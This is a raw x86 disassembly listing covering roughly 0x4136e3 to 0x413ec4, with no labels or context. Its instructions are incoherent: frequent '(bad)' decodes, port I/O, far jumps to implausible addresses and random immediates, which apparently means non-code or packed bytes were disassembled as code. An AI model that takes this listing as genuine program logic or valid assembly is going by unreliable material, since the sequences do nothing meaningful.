  4136e3:	add    eax,0xa941c940
  4136e8:	outs   dx,DWORD PTR ds:[esi]
  4136e9:	imul   esp,DWORD PTR [esi+0x55b95053],0x1b9cff95
  4136f3:	xor    al,0x11
  4136f5:	loope  0x4136b1
  4136f7:	xor    BYTE PTR [esi+0x2e],ch
  4136fa:	adc    DWORD PTR [ebx-0x2ea7bc0b],0x893367e0
  413704:	push   esp
  413705:	stos   DWORD PTR es:[edi],eax
  413706:	cmp    DWORD PTR [esi],esp
  413708:	sbb    BYTE PTR [ecx-0x392c6624],ch
  41370e:	inc    ebp
  41370f:	push   eax
  413710:	mov    cl,bh
  413712:	pop    es
  413713:	jno    0x41373e
  413715:	pop    ebp
  413716:	xor    eax,DWORD PTR [edi-0x50f894ab]
  41371c:	dec    ebp
  41371d:	push   esp
  41371e:	pop    eax
  41371f:	cmp    eax,DWORD PTR [edi-0x4a]
  413722:	or     BYTE PTR [ebx-0x5e7cbdf8],bh
  413728:	bound  ecx,QWORD PTR [eax]
  41372a:	dec    edx
  41372b:	ror    edx,0xf6
  41372e:	test   al,0xbe
  413730:	jbe    0x41376d
  413732:	int3   
  413733:	push   0x5ec35237
  413738:	loope  0x41372d
  41373a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41373c:	add    eax,0x5b823563
  413741:	loope  0x41378f
  413743:	xor    al,0xfa
  413745:	fwait
  413746:	dec    ecx
  413747:	or     BYTE PTR [esi],ch
  413749:	ror    DWORD PTR [eax],0xf
  41374c:	or     DWORD PTR [ecx-0x5c25ec41],ebx
  413752:	push   cs
  413753:	call   0x1729015
  413758:	sub    dl,BYTE PTR [edx]
  41375a:	pop    edx
  41375b:	enter  0xeeda,0xbc
  41375f:	xor    eax,0x6556cb62
  413764:	out    0x42,eax
  413766:	push   eax
  413767:	dec    ecx
  413768:	jno    0x413742
  41376a:	lock dec esp
  41376c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41376d:	push   esp
  41376e:	arpl   WORD PTR [ebx+eiz*8-0x2182760f],ax
  413775:	mov    bl,0x6f
  413777:	jne    0x413749
  413779:	push   0xcba541d
  41377e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41377f:	sar    BYTE PTR [edx],1
  413781:	fimul  DWORD PTR [ebx+0x48]
  413784:	jbe    0x4137ac
  413786:	jmp    0xa3f9de87
  41378b:	mov    ebp,0x8fc6ccbd
  413790:	mov    eax,ds:0x1c5c7032
  413795:	sbb    edx,DWORD PTR [ecx+0x53]
  413798:	sar    BYTE PTR [edi-0x438b8e7c],1
  41379e:	test   DWORD PTR [edx],eax
  4137a0:	stc    
  4137a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137a2:	mov    al,BYTE PTR [edx+0x54]
  4137a5:	sub    eax,0x6c8b511
  4137aa:	iret   
  4137ab:	loope  0x41377f
  4137ad:	inc    esp
  4137ae:	xor    BYTE PTR [edx],ah
  4137b0:	cmp    al,0x40
  4137b2:	xchg   esp,eax
  4137b3:	stos   DWORD PTR es:[edi],eax
  4137b4:	xor    al,0x8d
  4137b6:	mov    ah,0xb
  4137b8:	adc    ecx,DWORD PTR [eax-0x6eb2233f]
  4137be:	adc    BYTE PTR [ecx-0x79b98622],0x9b
  4137c5:	mov    gs,WORD PTR [eax-0xb]
  4137c8:	mov    bh,0xed
  4137ca:	pop    ds
  4137cb:	(bad)  
  4137cc:	sti    
  4137cd:	mov    ds:0xced5ad94,eax
  4137d2:	popa   
  4137d3:	pop    esp
  4137d4:	pop    es
  4137d5:	xor    BYTE PTR [esi-0x40],bl
  4137d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137d9:	adc    eax,DWORD PTR ds:0x2f8c2275
  4137df:	in     eax,dx
  4137e0:	mov    ecx,0x4500bde8
  4137e5:	lods   al,BYTE PTR ds:[esi]
  4137e6:	in     al,0xe
  4137e8:	(bad)  
  4137e9:	aam    0xae
  4137eb:	mov    al,ds:0x60f9e83
  4137f0:	test   DWORD PTR [esp+edi*4+0x66],eax
  4137f4:	mov    esp,0x9c66adcf
  4137f9:	xchg   edi,eax
  4137fa:	bnd jle 0x4137b3
  4137fd:	jno    0x4137f0
  4137ff:	gs sti 
  413801:	xchg   esi,eax
  413802:	inc    ebx
  413803:	fadd   st(2),st
  413805:	jne    0x4137f7
  413807:	imul   ebp,DWORD PTR [esi+0x46],0x1c13f9ff
  41380e:	jle    0x4137da
  413810:	loopne 0x4137c9
  413812:	push   ds
  413813:	jg     0x4137f7
  413815:	jb     0x4137c6
  413817:	and    al,0xed
  41381a:	push   0x6de79f5a
  41381f:	fsubr  DWORD PTR [ebx+ebp*8-0x2e5f97f]
  413826:	imul   esi,DWORD PTR [edx+0x2ece431e],0xe0b6961d
  413830:	sub    eax,0x808356dd
  413835:	ret    
  413836:	lods   eax,DWORD PTR ds:[esi]
  413837:	(bad)  
  413838:	ror    BYTE PTR [esi],0x67
  41383b:	dec    ebp
  41383c:	js     0x4137ca
  41383e:	(bad)
  413841:	cmp    cl,BYTE PTR [ebp+0x19]
  413844:	xchg   esi,eax
  413845:	push   0xffffffcf
  413847:	mov    eax,ds:0xba52e947
  41384c:	ins    DWORD PTR es:[edi],dx
  41384d:	into   
  41384e:	mov    edi,ds
  413850:	add    eax,0x44d7b3f7
  413855:	es ret 0xdd30
  413859:	mul    DWORD PTR [ebp+0x6b]
  41385c:	aas    
  41385d:	sbb    eax,0x92663e4f
  413862:	ror    eax,1
  413864:	mov    bh,0xfc
  413866:	aaa    
  413867:	(bad)
  41386b:	mov    dh,0x57
  41386d:	inc    esi
  41386e:	add    ebp,DWORD PTR [ebp+0x11ff5622]
  413874:	std    
  413875:	push   es
  413876:	adc    dl,BYTE PTR [esi-0x374c222a]
  41387c:	jp     0x41387b
  41387e:	mov    esp,0xaac6fcc8
  413883:	mov    WORD PTR [eax+0xdcf0eb],?
  413889:	out    dx,al
  41388a:	ins    BYTE PTR es:[edi],dx
  41388b:	jl     0x413900
  41388d:	inc    edi
  41388e:	mov    dl,0xcc
  413890:	es in  al,dx
  413892:	scas   al,BYTE PTR es:[edi]
  413893:	mov    esp,0x401c6617
  413898:	(bad)  [ecx-0x276d51b]
  41389e:	mov    dl,0x7e
  4138a0:	xor    eax,edx
  4138a2:	pushf  
  4138a3:	cli    
  4138a4:	add    eax,0xe0469676
  4138a9:	jns    0x413891
  4138ab:	mov    ds:0xce94aace,eax
  4138b0:	mov    WORD PTR [esi],es
  4138b2:	imul   DWORD PTR [eax-0x34]
  4138b5:	shl    BYTE PTR [edx],0xf
  4138b8:	fsubp  st(7),st
  4138ba:	mov    eax,ds:0x4248e4a7
  4138bf:	cdq    
  4138c0:	dec    ebx
  4138c1:	fcomp  QWORD PTR [ebx-0x153d2b71]
  4138c7:	in     eax,0xc9
  4138c9:	sbb    dh,0xa2
  4138cc:	cmp    eax,0x5c1e0097
  4138d1:	scas   eax,DWORD PTR es:[edi]
  4138d2:	jae    0x41394c
  4138d4:	fs push eax
  4138d6:	repnz pop eax
  4138d8:	(bad)  
  4138d9:	pop    ebp
  4138da:	nop
  4138db:	cdq    
  4138dc:	inc    edx
  4138dd:	add    cl,BYTE PTR [ecx-0x7b]
  4138e0:	sbb    eax,0x159e3131
  4138e5:	sub    BYTE PTR [ecx-0x5604f75c],bh
  4138eb:	and    edx,ecx
  4138ed:	push   es
  4138ee:	jae    0x413871
  4138f0:	jl     0x4138db
  4138f2:	pslld  mm6,QWORD PTR [ebp+ebx*4+0x1d15b907]
  4138fa:	dec    esi
  4138fb:	and    bh,dl
  4138fd:	scas   al,BYTE PTR es:[edi]
  4138fe:	sti    
  4138ff:	jp     0x413939
  413901:	pop    ebp
  413902:	xchg   ecx,eax
  413903:	or     al,bh
  413905:	aaa    
  413906:	data16 or al,0x1
  413909:	aam    0x8c
  41390b:	mov    eax,0x1b8cc466
  413910:	add    DWORD PTR [edi+0x2ff589ce],ecx
  413916:	cmp    al,0x1d
  413918:	adc    ch,ch
  41391a:	mov    ebp,0x49ad3a1e
  41391f:	xchg   BYTE PTR ds:0x4885f01d,dl
  413925:	dec    ebx
  413926:	jne    0x4138c1
  413928:	ins    DWORD PTR es:[edi],dx
  413929:	add    BYTE PTR [edi+0x15],0x1a
  41392d:	fs sub eax,0xdefe085f
  413933:	add    eax,0xf97e035f
  413938:	pop    esi
  413939:	and    al,0xaa
  41393b:	std    
  41393c:	repnz cmp ch,BYTE PTR [edi]
  41393f:	popa   
  413940:	(bad)  
  413941:	or     al,0xf
  413943:	popf   
  413944:	in     eax,0x50
  413946:	xlat   BYTE PTR ds:[ebx]
  413947:	jno    0x41395e
  413949:	ret    0x6980
  41394c:	and    al,0xb5
  41394e:	pop    esi
  41394f:	add    bl,BYTE PTR [edx]
  413951:	test   eax,0x318f3b1
  413956:	jmp    0x413969
  413958:	aam    0xbe
  41395a:	aad    0x6d
  41395c:	jle    0x4138ff
  41395e:	daa    
  41395f:	dec    edx
  413960:	fiadd  DWORD PTR es:[ebx+0x4cd063ac]
  413967:	inc    esp
  413968:	and    edi,edx
  41396a:	sahf   
  41396b:	sub    BYTE PTR [edi],dh
  41396d:	bnd jp 0x4139be
  413970:	js     0x413964
  413972:	rol    BYTE PTR [ebp-0x47d04fd8],cl
  413978:	imul   esi,DWORD PTR [eax+ecx*2-0x53],0x3db35fe2
  413980:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413982:	fcmove st,st(4)
  413984:	add    DWORD PTR [ebp+0x74],edi
  413987:	in     al,0xea
  413989:	inc    ebx
  41398a:	mov    ecx,0x9f9dcf24
  41398f:	cmp    BYTE PTR [esi],bl
  413991:	aam    0xcb
  413993:	rcl    BYTE PTR ds:0x5d1609b3,cl
  413999:	imul   esi,DWORD PTR [ecx],0xd117b34a
  41399f:	sub    DWORD PTR [edx],edi
  4139a1:	iret   
  4139a2:	cli    
  4139a3:	xchg   edx,eax
  4139a4:	das    
  4139a5:	adc    ecx,DWORD PTR [esi+0x12]
  4139a8:	stc    
  4139a9:	mov    dh,0x37
  4139ab:	pop    ebp
  4139ac:	pop    esp
  4139ad:	jg     0x4139c7
  4139af:	cmp    eax,0x110421ed
  4139b4:	test   al,0x29
  4139b6:	stos   DWORD PTR es:[edi],eax
  4139b7:	in     al,dx
  4139b8:	pop    ss
  4139b9:	xchg   edi,eax
  4139ba:	push   0xffffffec
  4139bc:	cwde   
  4139bd:	sahf   
  4139be:	push   0xce12a27c
  4139c3:	cmp    al,0xd6
  4139c5:	int3   
  4139c6:	jo     0x4139d7
  4139c8:	xor    esp,DWORD PTR [eax+0x400d84e9]
  4139ce:	imul   esi,DWORD PTR [eax+0x50],0x4
  4139d2:	inc    eax
  4139d3:	mov    bh,bl
  4139d5:	adc    al,0x2d
  4139d7:	rol    BYTE PTR [ebp+0x24c05493],cl
  4139dd:	(bad)  
  4139de:	sar    DWORD PTR [ebx-0x4c0f70ea],cl
  4139e4:	push   edi
  4139e5:	mov    ebx,esp
  4139e7:	mov    edi,0x41d4f714
  4139ec:	ins    DWORD PTR es:[edi],dx
  4139ed:	push   ebp
  4139ee:	scas   al,BYTE PTR es:[edi]
  4139ef:	daa    
  4139f0:	lods   al,BYTE PTR ds:[esi]
  4139f1:	pop    edi
  4139f2:	jge    0x413a34
  4139f4:	daa    
  4139f5:	mov    dh,0x96
  4139f7:	pop    ds
  4139f8:	jmp    0xcd43:0xff7b888d
  4139ff:	jg     0x413a18
  413a01:	jmp    0x71ebb94f
  413a06:	leave  
  413a07:	scas   eax,DWORD PTR es:[edi]
  413a08:	retf   0x16e6
  413a0b:	xor    al,0x41
  413a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a0e:	xor    eax,0x599cf1c4
  413a13:	retf   0x9103
  413a16:	addr16 (bad) 
  413a18:	clc    
  413a19:	cmp    ecx,esp
  413a1b:	xchg   esp,eax
  413a1c:	lahf   
  413a1d:	mov    ?,WORD PTR [ebx]
  413a1f:	in     al,0xf5
  413a21:	mov    bh,0x57
  413a23:	test   BYTE PTR [ecx-0x68],ch
  413a26:	push   esp
  413a27:	out    dx,eax
  413a28:	test   eax,0xc09b90ed
  413a2d:	adc    BYTE PTR [ebp+0x66],bh
  413a30:	lock sub BYTE PTR [esi-0x7d3d3a35],ah
  413a37:	imul   ecx,DWORD PTR [esi],0xfdb6b9b3
  413a3d:	xchg   ebp,eax
  413a3e:	shl    BYTE PTR [ecx],cl
  413a40:	adc    al,0xaa
  413a42:	xchg   ecx,eax
  413a43:	inc    edi
  413a44:	cmp    BYTE PTR [ebp+ecx*4-0x45],al
  413a48:	add    BYTE PTR [esi+eax*1+0x13],al
  413a4c:	(bad)  
  413a4d:	pop    ecx
  413a4e:	hlt    
  413a4f:	in     al,0xb1
  413a51:	xor    al,0x65
  413a53:	pusha  
  413a54:	xchg   esp,eax
  413a55:	loopne 0x413abd
  413a57:	stos   DWORD PTR es:[edi],eax
  413a58:	inc    eax
  413a59:	test   al,0xad
  413a5b:	pusha  
  413a5c:	dec    ecx
  413a5d:	rcl    DWORD PTR ds:0x18c942a2,cl
  413a63:	sub    al,0xc0
  413a65:	mov    cl,0x2f
  413a67:	cmp    eax,0xa3f43a70
  413a6c:	xchg   DWORD PTR [ecx-0xd44ebf7],eax
  413a72:	cmp    ebp,DWORD PTR [ebp+0x202cb582]
  413a78:	(bad)  
  413a7a:	js     0x413ace
  413a7c:	bound  esp,QWORD PTR [eax]
  413a7e:	cmp    BYTE PTR [ebx-0x37a1b3e7],bl
  413a84:	fnstcw WORD PTR [ecx+ebp*2+0x61]
  413a88:	xor    ebp,DWORD PTR [ebp+0x88a15ba]
  413a8e:	mov    bh,BYTE PTR [eax-0x4cf130af]
  413a94:	js     0x413a89
  413a96:	loop   0x413ac3
  413a98:	call   0xe22e:0xb3b34917
  413a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aa0:	xchg   edi,eax
  413aa1:	mov    esi,0x89799f3f
  413aa6:	xchg   ebx,eax
  413aa7:	ins    DWORD PTR es:[edi],dx
  413aa8:	sub    DWORD PTR [esi-0x26],esi
  413aab:	shr    DWORD PTR ds:0xb14726f,cl
  413ab1:	and    BYTE PTR [esi],cl
  413ab3:	test   BYTE PTR [eax],dl
  413ab5:	jle    0x413ad4
  413ab7:	es dec edi
  413ab9:	pop    ebx
  413aba:	div    BYTE PTR [ebp-0x13]
  413abd:	into   
  413abe:	ds aas 
  413ac0:	sub    DWORD PTR [edx+0x3be3912f],esp
  413ac6:	test   BYTE PTR [ecx+0x74cdbd54],al
  413acc:	sbb    eax,0x5b43afa4
  413ad1:	mov    ds:0x30f3148a,eax
  413ad6:	rcr    BYTE PTR [edi-0x386e94f4],cl
  413adc:	mov    eax,ds:0x4d28ae18
  413ae1:	adc    DWORD PTR [ecx],edi
  413ae3:	sbb    eax,0xe1fb0f12
  413ae8:	sbb    esp,0xc164c436
  413aee:	daa    
  413aef:	jb     0x413ae7
  413af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af3:	or     eax,0x5972eb73
  413af8:	xchg   edx,eax
  413af9:	scas   eax,DWORD PTR es:[edi]
  413afa:	sbb    DWORD PTR [esi+edx*1-0x534e17bd],edx
  413b01:	cwde   
  413b02:	ss mov ch,0x1c
  413b05:	jno    0x413b7d
  413b07:	xor    bl,BYTE PTR [ebp-0x68bf20b6]
  413b0d:	popa   
  413b0e:	inc    esp
  413b0f:	dec    DWORD PTR gs:[eax+0x3e4b6dc6]
  413b16:	pop    eax
  413b17:	push   edx
  413b18:	retf   0xaa0a
  413b1b:	es push ebp
  413b1d:	or     bl,BYTE PTR [eax]
  413b1f:	mov    bh,0x4a
  413b21:	add    BYTE PTR [edi],ah
  413b23:	pop    esi
  413b24:	call   0xfd51:0x57d995d5
  413b2b:	xor    BYTE PTR [ebx+0x152f5389],ch
  413b31:	imul   ebp,DWORD PTR [ebp+0x603e9ea3],0xffffffa0
  413b38:	int    0x1e
  413b3a:	add    ebx,DWORD PTR [ebx-0x1e]
  413b3d:	dec    ebx
  413b3e:	popa   
  413b3f:	push   esp
  413b40:	imul   eax,edi,0xfd01b677
  413b46:	std    
  413b47:	push   ebx
  413b48:	into   
  413b49:	je     0x413b69
  413b4b:	pop    ds
  413b4c:	and    eax,0xe6ab79ae
  413b51:	loopne 0x413b43
  413b53:	add    al,0x56
  413b55:	xlat   BYTE PTR ds:[ebx]
  413b56:	mov    eax,ds:0x8d54b489
  413b5b:	rol    DWORD PTR [ecx],cl
  413b5d:	(bad)  
  413b5e:	dec    ecx
  413b5f:	mov    ds:0x14a296f1,eax
  413b64:	inc    edi
  413b65:	and    bh,BYTE PTR [ecx+0x14]
  413b68:	adc    edx,DWORD PTR ds:0xb39b4bcd
  413b6e:	jne    0x413b4a
  413b70:	repz loop 0x413b86
  413b73:	popf   
  413b74:	xor    dl,ch
  413b76:	mov    ebx,0x440cf808
  413b7b:	in     eax,0x61
  413b7d:	cmp    BYTE PTR [esp+eiz*4-0xb],al
  413b81:	mov    dh,0x6
  413b83:	jno    0x413b2d
  413b85:	xor    al,0x7f
  413b87:	int3   
  413b88:	or     eax,0xeb48b7
  413b8d:	mov    ebx,0xbd318d5e
  413b92:	mov    ebp,0x30f87716
  413b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b98:	je     0x413b76
  413b9a:	xor    al,0x75
  413b9c:	inc    ebp
  413b9d:	std    
  413b9e:	push   esi
  413b9f:	mov    eax,ds:0x91711470
  413ba4:	pop    ss
  413ba5:	mul    edi
  413ba7:	jo     0x413b9e
  413ba9:	add    DWORD PTR ds:0x46631ff2,esp
  413baf:	fcomi  st,st(7)
  413bb1:	adc    bl,al
  413bb3:	jle    0x413be1
  413bb5:	jl     0x413c0f
  413bb7:	adc    di,ax
  413bba:	and    esp,DWORD PTR [esi+0x1416b444]
  413bc0:	nop
  413bc1:	mov    dl,0x13
  413bc3:	int    0x58
  413bc5:	mov    eax,ds:0x75694dd1
  413bca:	or     dl,ch
  413bcc:	pop    ebx
  413bcd:	adc    eax,0x1253e132
  413bd2:	and    dh,BYTE PTR [edi-0x20da04bc]
  413bd8:	mov    ch,0x4a
  413bda:	cs mov eax,0x2c04a664
  413be0:	pop    esi
  413be1:	ret    0x4684
  413be4:	mov    ds:0xa67a0185,eax
  413be9:	xchg   BYTE PTR ds:0x57c99e19,cl
  413bef:	jnp    0x413be7
  413bf1:	add    al,0x64
  413bf3:	scas   al,BYTE PTR es:[edi]
  413bf4:	jp     0x413bc0
  413bf6:	dec    edx
  413bf7:	and    dl,BYTE PTR [esi+0x6a]
  413bfa:	jne    0x413c13
  413bfc:	data16 stos BYTE PTR es:[edi],al
  413bfe:	lock dec esi
  413c00:	sbb    BYTE PTR [eax-0x3a],bh
  413c03:	dec    esp
  413c04:	call   0x7d06df5a
  413c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c0a:	add    BYTE PTR [ebp-0x77],0x6e
  413c0e:	or     BYTE PTR [ecx-0x3b],dl
  413c11:	sub    eax,0x26198040
  413c16:	in     al,dx
  413c17:	cwde   
  413c18:	loope  0x413c56
  413c1a:	ficom  WORD PTR [edx]
  413c1c:	dec    ebx
  413c1d:	(bad)  
  413c1e:	push   edx
  413c1f:	cwde   
  413c20:	std    
  413c21:	inc    ebp
  413c22:	dec    ebp
  413c23:	imul   esi,DWORD PTR [ecx-0x3d4d1a89],0x8247a8ea
  413c2d:	(bad)  
  413c2f:	dec    ebp
  413c30:	pop    edx
  413c31:	xchg   edx,eax
  413c32:	pop    edx
  413c33:	sbb    eax,DWORD PTR [ecx-0x23e677db]
  413c39:	shr    DWORD PTR [esp+eax*4],1
  413c3c:	aas    
  413c3d:	ds push ss
  413c3f:	in     al,dx
  413c40:	jno    0x413c4c
  413c42:	adc    eax,0x73e94595
  413c47:	inc    edi
  413c48:	pop    edi
  413c49:	mov    esp,?
  413c4b:	mov    ebx,0x65e4822a
  413c50:	xor    eax,0x2296362
  413c55:	fisub  WORD PTR [ecx-0xa]
  413c59:	(bad)  
  413c5a:	mov    ds:0xb4432bbc,eax
  413c5f:	jns    0x413c54
  413c61:	dec    edi
  413c62:	sub    bh,al
  413c64:	dec    edi
  413c65:	outs   dx,BYTE PTR ds:[esi]
  413c66:	pop    ebx
  413c67:	or     DWORD PTR [edx],esi
  413c69:	int3   
  413c6a:	xchg   ax,ax
  413c6c:	jb     0x413c34
  413c6e:	loop   0x413c72
  413c70:	or     al,0xd9
  413c72:	out    dx,eax
  413c73:	sub    eax,0xc215c545
  413c78:	jb     0x413c9a
  413c7a:	mov    esi,0x372cf3e5
  413c7f:	sub    BYTE PTR [esi-0x4d],0x2c
  413c83:	pop    edi
  413c84:	mov    ch,0xf3
  413c86:	jmp    FWORD PTR [esi+0xe]
  413c89:	and    al,0x2d
  413c8b:	and    ch,dh
  413c8d:	(bad)  
  413c8e:	aam    0x23
  413c90:	pop    ds
  413c91:	lds    esi,FWORD PTR [esi-0x30]
  413c94:	mov    ah,0x4f
  413c96:	iret   
  413c97:	or     DWORD PTR [edi+0x7d],edx
  413c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c9b:	(bad)  
  413c9c:	in     al,0x91
  413c9e:	sub    BYTE PTR [ebp-0x5e9b2d49],cl
  413ca4:	or     BYTE PTR [esi],dl
  413ca6:	bound  ecx,QWORD PTR [esi+0x67]
  413ca9:	aaa    
  413caa:	adc    DWORD PTR [ebx+0x28],esi
  413cad:	mov    al,ds:0x5948c1af
  413cb2:	retf   
  413cb3:	call   0xe8d6e335
  413cb8:	pusha  
  413cb9:	shr    BYTE PTR [esi+0x57],0x7e
  413cbd:	and    BYTE PTR [ebp-0x3af4a04],0x40
  413cc4:	out    0x1,eax
  413cc6:	add    al,0x71
  413cc8:	inc    eax
  413cc9:	jbe    0x413d32
  413ccb:	cld    
  413ccc:	cmp    eax,0xe426861b
  413cd1:	mov    edx,0xbc3f556f
  413cd6:	cmp    ebx,DWORD PTR [ebx+0x6a]
  413cd9:	fs inc edi
  413cdb:	push   0x2c
  413cdd:	fdiv   DWORD PTR [edx]
  413cdf:	idiv   BYTE PTR [ebx+esi*2-0x4e]
  413ce3:	test   DWORD PTR [edx],edi
  413ce5:	out    dx,eax
  413ce6:	cli    
  413ce7:	push   ss
  413ce8:	push   ss
  413ce9:	loopne 0x413d1e
  413ceb:	jbe    0x413cab
  413ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cef:	mov    edi,0x6bf6a8d8
  413cf4:	icebp  
  413cf5:	jae    0x413d4d
  413cf7:	push   0xffffff8b
  413cf9:	add    dh,BYTE PTR [ebp+0x6319ad9a]
  413cff:	and    al,0xc4
  413d01:	mov    ?,WORD PTR [ecx+0x5d]
  413d04:	loopne 0x413ca2
  413d06:	sub    eax,0xc6dd242a
  413d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d0c:	and    edx,DWORD PTR cs:[esi+0x68]
  413d10:	jno    0x413ccd
  413d12:	mov    edi,0xabc3fd83
  413d17:	xor    al,0x70
  413d19:	adc    esp,eax
  413d1b:	pop    ss
  413d1c:	bound  edi,QWORD PTR [edx+0x23]
  413d1f:	sbb    BYTE PTR [edi],bh
  413d21:	les    edx,FWORD PTR [ecx+0x13dc8ca4]
  413d27:	mov    bh,0x5e
  413d29:	jnp    0x596562cb
  413d2f:	mov    ds:0x51404ced,eax
  413d34:	in     al,dx
  413d35:	pop    esp
  413d36:	outs   dx,DWORD PTR ds:[esi]
  413d37:	cli    
  413d38:	imul   ecx
  413d3a:	mov    ch,0xad
  413d3c:	out    0xa7,al
  413d3e:	mov    fs,edx
  413d40:	jp     0x413cd7
  413d42:	mov    ds:0x309b8dea,al
  413d47:	stos   BYTE PTR es:[edi],al
  413d48:	jns    0x413d9d
  413d4a:	ret    
  413d4b:	mov    esp,DWORD PTR [esi]
  413d4d:	and    al,0x1c
  413d4f:	std    
  413d50:	cli    
  413d51:	ins    BYTE PTR es:[edi],dx
  413d52:	sbb    BYTE PTR [eax-0x3f],cl
  413d55:	push   cs
  413d56:	mov    gs,WORD PTR [ebx]
  413d58:	dec    edi
  413d59:	xlat   BYTE PTR ds:[ebx]
  413d5a:	fcom   QWORD PTR [ebp+0xc]
  413d5d:	sbb    al,BYTE PTR [ebp-0x67c824e0]
  413d63:	stc    
  413d64:	dec    ebp
  413d65:	test   al,0xb7
  413d67:	bound  edx,QWORD PTR [edi+edx*2+0x52fb96b6]
  413d6e:	dec    esi
  413d6f:	scas   al,BYTE PTR es:[edi]
  413d70:	add    DWORD PTR [edx],esp
  413d72:	pop    edx
  413d73:	and    al,0x76
  413d75:	les    ebp,FWORD PTR [ecx+0x511e92dc]
  413d7b:	push   edi
  413d7c:	pop    edi
  413d7d:	jbe    0x413dc1
  413d7f:	mov    BYTE PTR [edx],ah
  413d81:	pop    esi
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	test   DWORD PTR [edx],ebp
  413d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d86:	sub    dl,ah
  413d88:	push   es
  413d89:	mov    ah,0xbe
  413d8b:	fs and DWORD PTR cs:[edi-0x6285e61c],0x21ad25dc
  413d97:	add    al,BYTE PTR [eax+edx*8-0x6e]
  413d9b:	pop    esp
  413d9c:	add    DWORD PTR [eax],esi
  413d9e:	clc    
  413d9f:	inc    esi
  413da0:	sub    ch,BYTE PTR [edi+ebp*8-0x3c]
  413da4:	ins    DWORD PTR es:[edi],dx
  413da5:	dec    esi
  413da6:	pop    esi
  413da7:	bound  edi,QWORD PTR [ecx+0x3b82ca2a]
  413dad:	mov    al,0x85
  413daf:	jno    0x413d3b
  413db1:	leave  
  413db2:	in     al,0xc3
  413db4:	enter  0x67f5,0x0
  413db8:	inc    ebx
  413db9:	stc    
  413dba:	pop    ebx
  413dbb:	fisub  WORD PTR [edi]
  413dbd:	jp     0x413e37
  413dbf:	adc    eax,ebx
  413dc1:	xchg   edx,eax
  413dc2:	pop    edi
  413dc3:	mov    ecx,0x6140d16e
  413dc8:	sbb    ch,BYTE PTR [edi+0x78]
  413dcb:	jns    0x413df6
  413dcd:	sub    BYTE PTR [esi+0x3dafeeb1],cl
  413dd3:	xor    ah,ah
  413dd5:	sbb    ecx,0xffffffb6
  413dd8:	in     eax,0x21
  413dda:	xchg   edx,eax
  413ddb:	mov    edx,0xf88c0f03
  413de0:	xor    BYTE PTR [ebx+0x5a996c48],0x5a
  413de7:	jle    0x413dd4
  413de9:	pop    esi
  413dea:	mov    ebp,0x4e54007f
  413def:	jmp    0xb2551805
  413df4:	shl    DWORD PTR [ecx-0x494078d9],1
  413dfa:	loopne 0x413d98
  413dfc:	push   ebx
  413dfd:	mov    cl,0x3d
  413dff:	inc    eax
  413e00:	sahf   
  413e01:	and    BYTE PTR [esi-0x35c419e3],0x67
  413e08:	pusha  
  413e09:	adc    eax,0xadf8afe4
  413e0e:	adc    BYTE PTR [edx],al
  413e10:	sub    cl,BYTE PTR [ebp+0x2f]
  413e13:	push   0x92eb4efb
  413e18:	or     DWORD PTR [ecx],esi
  413e1a:	or     DWORD PTR [ecx+0x3c7fdf47],ebx
  413e20:	push   0x89da80b6
  413e25:	push   es
  413e26:	or     ebp,0x81c390ff
  413e2c:	push   esp
  413e2d:	mov    ah,0x43
  413e2f:	and    al,BYTE PTR [eax]
  413e31:	or     BYTE PTR [edx+0x51],bl
  413e34:	ret    0x6de9
  413e37:	sub    dh,ch
  413e39:	ins    BYTE PTR es:[edi],dx
  413e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e3b:	mov    dh,0x9a
  413e3d:	push   ebx
  413e3e:	stc    
  413e3f:	repz inc ecx
  413e41:	sbb    ecx,DWORD PTR [edx-0x782a97dc]
  413e47:	mov    edi,0x995d86c
  413e4c:	pop    esp
  413e4d:	call   0x3a9bd8c2
  413e52:	xchg   edi,eax
  413e53:	jmp    0xe6db:0xfb273bb5
  413e5a:	fistp  DWORD PTR [esi-0x55]
  413e5d:	fs push cs
  413e5f:	sbb    esp,ebx
  413e61:	enter  0xef1b,0x24
  413e65:	inc    ecx
  413e66:	inc    ebx
  413e67:	ja     0x413e85
  413e69:	xor    DWORD PTR [ebx],0x5eb3d2ec
  413e6f:	mov    cl,0xc6
  413e71:	pop    es
  413e72:	add    al,0xdf
  413e74:	jmp    0xaf498330
  413e79:	(bad)  [ecx-0x4c482f85]
  413e7f:	mov    ss,esp
  413e81:	pop    edx
  413e82:	mov    ebx,DWORD PTR [ebp+0x61583a56]
  413e88:	fldcw  WORD PTR [ebx-0x2d]
  413e8b:	inc    ebx
  413e8d:	push   esp
  413e8e:	(bad)  
  413e8f:	sub    al,0xe1
  413e91:	cmp    edi,DWORD PTR [edx-0x13]
  413e94:	icebp  
  413e95:	adc    al,0xa3
  413e97:	mov    al,ds:0x9676050f
  413e9c:	cwde   
  413e9d:	xchg   edi,eax
  413e9e:	loopne 0x413ec7
  413ea0:	pop    ebx
  413ea1:	add    DWORD PTR [esi+0x4f9706c8],esi
  413ea7:	mov    ebx,DWORD PTR [edx+0x48c8b958]
  413ead:	sbb    eax,0x2db1541a
  413eb2:	test   ah,ch
  413eb4:	jp     0x413ef6
  413eb6:	loopne 0x413e9f
  413eb8:	es dec edi
  413eba:	idiv   ebp
  413ebc:	into   
  413ebd:	cmp    BYTE PTR [edx+eax*1],ah
  413ec0:	jg     0x413eeb
  413ec2:	pop    eax
  413ec3:	inc    edx
  413ec4:	xchg   edx,eax
